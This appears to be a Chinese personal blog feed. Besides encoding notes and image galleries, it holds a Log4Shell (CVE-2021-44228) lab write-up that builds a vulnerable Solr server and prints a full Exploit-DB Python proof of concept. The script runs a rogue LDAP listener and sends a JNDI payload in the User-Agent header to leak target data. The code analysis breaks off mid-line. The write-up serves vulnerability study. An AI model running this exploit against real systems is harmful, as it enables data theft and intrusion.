<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721194551860.png" alt="image-20220721194551860"></p>
<h2 id="3、16进制Unicode——示例"><a href="#3、16进制Unicode——示例" class="headerlink" title="3、16进制Unicode——示例"></a>3、16进制Unicode——示例</h2><p><u><strong>\u8fd9\u662f\u4e00</strong></u></p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721194631625.png" alt="image-20220721194631625"></p>
<p>常用解密网站：</p>
<p>  <strong>·</strong>Unicode：</p>
<p><code>www.sojson.com</code></p>
<p>  <strong>·</strong>16进制Unicode：</p>
<p><code>www.msxindl.com</code></p>
<p> <strong>·</strong>HTML字符实体：</p>
<p><code>www.qqxiuzi.cn</code></p>
<p>….还有一些引入密钥的非对称型算法，可以看看原文</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>我的老婆照片</title>
    <url>/2022/11/04/%E6%8B%A9%E5%81%B6%E6%A0%87%E5%87%86%E9%AB%98%E6%9C%A8%E5%90%8C%E5%AD%A6/</url>
    <content><![CDATA[<p><strong><code>欢迎大家来看望我的老婆高木，我是她的老公Ttoc</code></strong></p>
<span id="more"></span>

<p><img src="https://img0.baidu.com/it/u=3167365822,1512350394&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=281" alt="img"></p>
<p><img src="https://img2.baidu.com/it/u=1274769342,505896326&fm=253&fmt=auto&app=120&f=JPEG?w=478&h=1000" alt="img"></p>
<p><img src="https://img1.baidu.com/it/u=1567446463,2599104417&fm=253&fmt=auto&app=120&f=JPEG?w=500&h=644" alt="img"></p>
<p><img src="https://img1.baidu.com/it/u=3529857214,270267501&fm=253&fmt=auto&app=138&f=JPEG?w=400&h=283" alt="img"></p>
<p><img src="https://img0.baidu.com/it/u=1154622452,3283540884&fm=253&fmt=auto&app=120&f=JPEG?w=641&h=412" alt="img"></p>
<p><img src="https://img2.baidu.com/it/u=3902004953,3713136265&fm=253&fmt=auto&app=138&f=JPG?w=400&h=217" alt="img"></p>
<p><img src="https://img0.baidu.com/it/u=789404348,4092425280&fm=253&fmt=auto&app=138&f=JPEG?w=506&h=500" alt="img"></p>
<p><img src="https://img1.baidu.com/it/u=3163830073,336599065&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=618" alt="img"></p>
<p><img src="https://img2.baidu.com/it/u=2082028348,3487745437&fm=253&fmt=auto&app=138&f=JPEG?w=890&h=500" alt="img"></p>
<p><img src="https://img0.baidu.com/it/u=3604510951,366494962&fm=253&fmt=auto&app=138&f=JPG?w=581&h=500" alt="img"></p>
<p><img src="https://img1.baidu.com/it/u=2843273752,1955020356&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=750" alt="img"></p>
<p><img src="https://img2.baidu.com/it/u=643317784,4145454445&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=711" alt="img"></p>
<p><img src="https://img0.baidu.com/it/u=3493245667,4108937152&fm=253&fmt=auto&app=138&f=JPEG?w=347&h=500" alt="img"></p>
<p><img src="https://img1.baidu.com/it/u=1644934114,1822959849&fm=253&fmt=auto&app=138&f=PNG?w=500&h=282" alt="img"></p>
<p><img src="https://img2.baidu.com/it/u=1908094365,3745635881&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=677" alt="img"></p>
<p><img src="https://img0.baidu.com/it/u=2525076093,2619981103&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=708" alt="img"></p>
<p><img src="https://img2.baidu.com/it/u=3590397336,728101146&fm=253&fmt=auto&app=120&f=JPEG?w=790&h=1000" alt="img"></p>
<p><img src="https://img0.baidu.com/it/u=1587043172,585553815&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=786" alt="img"></p>
<p><img src="https://img2.baidu.com/it/u=1658379964,671909388&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1667667600&t=eb46a27a1e605bf5f303b45485d35d9b" alt="img"></p>
<p><img src="https://img0.baidu.com/it/u=3080117260,965213977&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1667667600&t=4487cbacc6e71e7f7a5569873b01d56c" alt="img"></p>
<p><img src="https://img2.baidu.com/it/u=2182382835,1489043186&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1667667600&t=f79fb318ababa98b49cd073b54d983c0" alt="img"></p>
<p><img src="https://img1.baidu.com/it/u=3478366107,3159715980&fm=253&app=120&size=w931&n=0&f=JPEG&fmt=auto?sec=1667667600&t=9159e5ca9bbd08407c918cef1374ef8e" alt="img"></p>
<p><img src="https://img0.baidu.com/it/u=26811461,4127564453&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1667667600&t=483ae587aa1bc88bf5e296cb9cef6931" alt="img"></p>
<p><img src="https://img2.baidu.com/it/u=2079089821,4287736665&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1667667600&t=535b68d7a3e88d2d302179d58436c519" alt="img"></p>
]]></content>
      <categories>
        <category>高木，我的老婆不解释</category>
      </categories>
      <tags>
        <tag>喜欢</tag>
      </tags>
  </entry>
  <entry>
    <title>然然美照捏</title>
    <url>/2022/09/01/%E5%98%89%E7%84%B6%E7%BE%8E%E7%85%A7%E6%8D%8F/</url>
    <content><![CDATA[<p><strong><code>编程玩的再好，我也不能编出完美爱情  </code></strong></p>
<p><strong><code>渗透玩的再强，我也不能提权进你的心</code></strong></p>
<span id="more"></span>

<p><img src="https://pic4.zhimg.com/80/v2-934e6fa2e65409827765dd10d55126fb_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://imgs.aixifan.com/content/2021_6_19/1.6240698992155275E9.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_bef3f9a1a99a46788042b04c38a7b243.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_760fe0000b7246ac811395092e22052d.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_c3ac0b2629d34c11a3f04bf00e742c8e.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_501d0f80926f45d386c1b09a7f60fa4e.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_1100ec000f55417f9ab605963c6b4496.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_60a32c7de2cc4eaf9d04c7bd251bf4ea.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_5dd902eab8dd4ab3979801ca40aabf0f.jpeg" alt="img"></p>
<p><img src="https://pica.zhimg.com/80/v2-932f2c2c69627ba96a8cfe1dea81e36f_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pica.zhimg.com/80/v2-a3fb342d44bd85b2bd0641c826c6bbd0_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic2.zhimg.com/80/v2-f15c9426e18febfac5bde90270faf6a3_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-dbb499988d949727a787cce0e5421583_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic2.zhimg.com/80/v2-89672d74dc493ddbf3152ab56b461b88_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-4b4ff0c4014e2a19d8e4973a15d29465_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-c807aec307bef9260d824a2c5e0c0beb_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-6fe879b650da6caa23c3078ece271f13_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic3.zhimg.com/80/v2-e5df9c9a913de7d44387d4c2b3d00472_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-9c3a89ea03680304931488372d908bcd_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pica.zhimg.com/80/v2-1afbaf55afe9662ec475664384f14403_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-53fd4aa98586e32c56c20d5f3b6a06d5_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic2.zhimg.com/80/v2-aee64d3f967e8c33ec5b49401bae2ade_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-c7dfefd2eea3dcef90ef7ee9ad6dd4d3_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-d0006553decea872cd9e63bf0d97e810_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-9f8b7b5e3dd5d64b592823edb34689f8_1440w.jpg?source=1940ef5c" alt="img"></p>
]]></content>
      <categories>
        <category>要给然然单独开一个分类捏</category>
      </categories>
      <tags>
        <tag>喜欢</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE漏洞</title>
    <url>/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p><strong><code>想把一些常见的CVE以及一些经典漏洞复现，做做笔记</code></strong></p>
<span id="more"></span>

<h1 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Apache</span> Log4j2 是一个被广泛使用的开源日志记录库，<span class="number">2017</span> 年 <span class="number">7</span> 月时，有人向 Log4j2 提了支持 JNDI Lookup 的需求，并从 <span class="number">2</span>.<span class="number">0</span>-beta9 之后开始支持；今年阿里的安全研究人员发现该特性会导致远程代码执行，于 <span class="number">2021</span> 年 <span class="number">11</span> 月 <span class="number">24</span> 日向 Apache 报告了该漏洞；<span class="number">12</span> 月 <span class="number">5</span> 日官方发布了补丁；到了 <span class="number">12</span> 月 <span class="number">9</span> 日晚，PoC 的传播范围开始变得不可控，基本上各大厂商都受影响，影响范围很广，于是人们给它起了个名字——Log4Shell。</span><br></pre></td></tr></table></figure>

<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">环境搭建虚拟机版本</span><span class="punctuation">:</span> <span class="string">ubuntu 20.4</span></span><br><span class="line"><span class="attribute">Apache solr版本</span><span class="punctuation">:</span> <span class="string">8.11.0</span></span><br></pre></td></tr></table></figure>

<h3 id="Apache-solr-8-11-0下载"><a href="#Apache-solr-8-11-0下载" class="headerlink" title="Apache solr 8.11.0下载"></a>Apache solr 8.11.0下载</h3><p>这里我采用的是<code>Apache Solr</code>开源服务器</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Solr是Apache下的一个顶级开源项目，采用Java开发，它是基于Lucene的全文搜索服务器。Solr提供了比Lucene更为丰富的查询语言，同时实现了可配置、可扩展，并对索引、搜索性能进行了优化。</span><br></pre></td></tr></table></figure>

<p>针对漏洞修复时间<code>[12 月 5 日]</code>，和官方更新文档</p>
<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201005804892.png" alt="image-20221201005804892"></p>
<p><code>Apache Solr 8.11.0</code>是<code>CVE-2021-44228</code>修复前的最后的一个版本</p>
<p>所以该版本也存在<code>CVE-2021-44228</code></p>
<p>于是下载</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>archive.apache.org<span class="regexp">/dist/</span>lucene<span class="regexp">/solr/</span><span class="number">8.11</span>.<span class="number">0</span>/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201010242171.png" alt="image-20221201010242171"></p>
<h3 id="JAVA配置"><a href="#JAVA配置" class="headerlink" title="JAVA配置"></a>JAVA配置</h3><p>由于<code>Apache solr</code>是基于<code>Java</code>开发的项目，所以需要先下载对应版本的<code>Java</code></p>
<p><strong>但是针对log4j2存在的版本，需要jdk1.8.0才可以复现</strong></p>
<p>但是</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">高版本的JDK环境中trustURLCodebase变量为false，限制了远程类的加载，导致JNDI注入利用失败，无法反弹shell</span><br><span class="line">能实现利用条件：版本≤ JDK <span class="number">6u211、7u201</span>、 <span class="number">8u191、11.0</span>.<span class="number">1</span>。</span><br><span class="line">但是过低版本的，solr运行可能会出错</span><br></pre></td></tr></table></figure>

<p>所以这里从官网下载专门的<code>8u171</code></p>
<h4 id="解压到对应目录"><a href="#解压到对应目录" class="headerlink" title="解压到对应目录"></a>解压到对应目录</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">tar -zxvf jdk-<span class="number">8</span>u171-linux-x64.tar.gz -C <span class="regexp">/usr/</span>local<span class="regexp">/jdk/</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221161421513.png" alt="image-20221221161421513"></p>
<h4 id="部署并修改环境变量"><a href="#部署并修改环境变量" class="headerlink" title="部署并修改环境变量"></a>部署并修改环境变量</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vi ~/.bashrc</span><br><span class="line">在文件末尾追加下面6行内容</span><br><span class="line"><span class="comment">#set oracle jdk environment</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 <span class="comment">## 这里要注意目录要换成自己解压的jdk 目录</span></span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300</span><br></pre></td></tr></table></figure>

<h4 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">version</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221161638879.png" alt="image-20221221161638879"></p>
<h3 id="Solr下载"><a href="#Solr下载" class="headerlink" title="Solr下载"></a><code>Solr</code>下载</h3><p>下载<code>solr 8.11.0</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> wget https://archive.apache.org/dist/lucene/solr/<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201111930502.png" alt="image-20221201111930502"></p>
<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201112302036.png" alt="image-20221201112302036"></p>
<p>然后就解压</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> tar xzf solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201112554067-1671632324475-1.png" alt="image-20221201112554067"></p>
<h3 id="安装-Apache-Solr服务"><a href="#安装-Apache-Solr服务" class="headerlink" title="安装 Apache Solr服务"></a>安装 <code>Apache Solr</code>服务</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> bash solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/bin/install_solr_service.sh solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201112725299.png" alt="image-20221201112725299"></p>
<p>查看服务状态</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo systemctl status solr</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201112839632.png" alt="image-20221201112839632"></p>
<p>发现服务已经存在</p>
<p>启动</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo <span class="regexp">/lib/</span>systemd/systemd-sysv-install enable solr</span><br><span class="line"><span class="comment">#若执行sudo systemctl enable solr会提示不是本机服务，需要按上面方式启动运行</span></span><br></pre></td></tr></table></figure>

<p>因为<code>solr</code>默认运行的端口为<code>8983</code></p>
<p>查看环境搭建的虚拟机<code>ip</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201113319037.png" alt="image-20221201113319037"></p>
<p>得到环境搭建靶机<code>ip</code>为</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.80.131</span></span><br></pre></td></tr></table></figure>

<h3 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h3><p>浏览器访问</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220220624019.png" alt="image-20221220220624019"></p>
<p>搭建成功</p>
<p>内网环境中的攻击机也成功访问</p>
<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201115827107.png" alt="image-20221201115827107"></p>
<p>环境搭建完毕</p>
<h2 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h2><p>这里调用**<code>exploitdb</code>**中的对<code>Log4j2</code>利用的脚本，这是一个信息泄露的脚本</p>
<p>发布时间: <code>12/12/2021</code></p>
<p><code>【ps.这个脚本可能是作者上传到exp的时候空格问题，需要稍微修改一下就可以用了】</code></p>
<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221204224323306-1671800988704-1.png" alt="image-20221204224323306"></p>
<p>脚本内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure</span></span><br><span class="line"><span class="comment"># Date: 12/12/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: leonjza</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://logging.apache.org/log4j/2.x/</span></span><br><span class="line"><span class="comment"># Version: &lt;= 2.14.1</span></span><br><span class="line"><span class="comment"># CVE: CVE-2021-44228</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pure python ENV variable leak PoC for CVE-2021-44228</span></span><br><span class="line"><span class="comment"># Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 2021 @leonjza</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j</span></span><br><span class="line"><span class="string">&lt;=2.14 information disclosure poc &#x27;</span></span><br><span class="line">                                                 <span class="string">&#x27;(ref:</span></span><br><span class="line"><span class="string">https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on</span></span><br><span class="line"><span class="string">(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;see:</span></span><br><span class="line"><span class="string">https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br><span class="line"></span><br><span class="line">    serv_thread = threading.Thread(target=server.serve_forever)</span><br><span class="line">    serv_thread.daemon = <span class="literal">True</span></span><br><span class="line">    serv_thread.start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server.shutdown()</span><br><span class="line">        server.server_close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()                </span><br></pre></td></tr></table></figure>

<h3 id="信息泄露脚本分析"><a href="#信息泄露脚本分析" class="headerlink" title="信息泄露脚本分析"></a>信息泄露脚本分析</h3><h4 id="LDAP-HEADER"><a href="#LDAP-HEADER" class="headerlink" title="LDAP_HEADER"></a>LDAP_HEADER</h4><p>定义 <code>LDAP_HEADER</code> 常量，这是响应 <code>LDAP</code> 请求时使用的头信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="ThreadedTCPRequestHandler"><a href="#ThreadedTCPRequestHandler" class="headerlink" title="ThreadedTCPRequestHandler"></a>ThreadedTCPRequestHandler</h4><p>这里定义<code>ThreadedTCPRequestHandler</code> 类的 <code>handle()</code> 方法用于处理来自客户端的连接。</p>
<p>该方法首先输出来自客户端的连接信息，然后通过调用 <code>sock.recv()</code> 和 <code>sock.sendall()</code> 方法读取客户端发送</p>
<p>的数据，并发送响应数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span 